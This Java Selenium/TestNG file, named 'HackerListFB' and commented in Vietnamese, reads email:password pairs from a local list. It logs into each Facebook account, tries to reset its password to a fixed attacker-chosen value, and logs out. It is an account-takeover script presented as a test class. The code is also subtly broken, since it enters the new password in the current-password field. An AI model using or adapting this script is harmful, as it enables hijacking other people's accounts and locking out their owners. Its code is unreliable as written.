package edu.poly.test;

import org.openqa.selenium.By;
import org.openqa.selenium.JavascriptExecutor;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.WebElement;
import org.openqa.selenium.chrome.ChromeDriver;
import org.openqa.selenium.support.ui.ExpectedConditions;
import org.openqa.selenium.support.ui.WebDriverWait;
import org.testng.annotations.Test;

import java.io.File;
import java.io.FileNotFoundException;
import java.time.Duration;
import java.util.Scanner;

import io.github.bonigarcia.wdm.WebDriverManager;

public class HackerListFB {
    @Test
    public void testMultipleAccountsLogin() throws FileNotFoundException {
        WebDriverManager.chromedriver().setup();
        WebDriver driver = new ChromeDriver();
        driver.manage().window().maximize();

        File accountsFile = new File("C:\\listfb\\accounts.txt"); // Tệp chứa danh sách tài khoản và mật khẩu
        Scanner scanner = new Scanner(accountsFile);

        while (scanner.hasNextLine()) {
            String[] accountInfo = scanner.nextLine().split(":");
            String email = accountInfo[0];
            String password = accountInfo[1];

            // Đăng nhập vào tài khoản Facebook
            loginToFacebook(driver, email, password);

            // Đổi mật khẩu
            changePassword(driver, "123456789Phuong");

            // Quay lại trang chủ
            driver.get("https://www.facebook.com/");

            // Đăng xuất khỏi tài khoản
            logoutFromFacebook(driver);
        }

        scanner.close();
        driver.quit();
    }

    private void loginToFacebook(WebDriver driver, String email, String password) {
        driver.get("https://www.facebook.com");
        WebElement emailInput = driver.findElement(By.id("email"));
        emailInput.sendKeys(email);
        WebElement passwordInput = driver.findElement(By.id("pass"));
        passwordInput.sendKeys(password);
        WebElement loginButton = driver.findElement(By.name("login"));
        loginButton.click();

        WebDriverWait wait = new WebDriverWait(driver, Duration.ofSeconds(10));
        wait.until(ExpectedConditions.urlContains("facebook.com"));
    }

    private void changePassword(WebDriver driver, String newPassword) {
        // Điều hướng đến trang cài đặt
        driver.get("https://www.facebook.com/settings");

        // Điều hướng đến trang thay đổi mật khẩu
        driver.get("https://accountscenter.facebook.com/password_and_security/password/change");

        // Nhập mật khẩu hiện tại
        WebElement currentPasswordInput = driver.findElement(By.id("password_old"));
        currentPasswordInput.sendKeys(newPassword);

        // Nhập mật khẩu mới và xác nhận
        WebElement newPasswordInput = driver.findElement(By.id("password_new"));
        WebElement confirmPasswordInput = driver.findElement(By.id("password_confirm"));
        newPasswordInput.sendKeys(newPassword);
        confirmPasswordInput.sendKeys(newPassword);

        // Lưu thay đổi
        WebElement saveButton = driver.findElement(By.xpath("//button[contains(text(), 'Save Changes')]"));
        saveButton.click();
    }

    private void logoutFromFacebook(WebDriver driver) {
        // Nhấp vào menu dropdown
        WebElement accountMenu = driver.findElement(By.xpath("//div[@aria-label='Account']"));
        accountMenu.click();

        // Chờ cho menu xuất hiện và nhấp vào nút Đăng xuất
        WebDriverWait wait = new WebDriverWait(driver, Duration.ofSeconds(10));
        WebElement logoutButton = wait.until(ExpectedConditions.visibilityOfElementLocated(By.xpath("//span[text()='Log Out']")));
        logoutButton.click();

        // Chờ cho xác nhận đăng xuất xuất hiện và chọn Đồng ý
        WebElement confirmLogoutButton = wait.until(ExpectedConditions.visibilityOfElementLocated(By.xpath("//button[text()='Log Out']")));
        confirmLogoutButton.click();
    }
}
